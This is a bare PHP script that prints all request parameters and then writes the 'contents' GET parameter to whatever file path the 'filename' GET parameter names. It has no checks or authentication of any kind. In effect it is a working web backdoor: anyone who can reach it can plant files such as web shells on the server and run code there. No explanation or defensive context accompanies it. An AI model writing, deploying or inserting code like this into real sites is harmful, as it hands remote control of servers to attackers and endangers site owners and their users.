<?php

	header("Content-type: text/plain");
    print_r($_REQUEST);

	$File = $_GET['filename'];
	$Handle = fopen($File, 'w');
	$Data = $_GET['contents']; 
	fwrite($Handle, $Data);  
	fclose($Handle); 
?>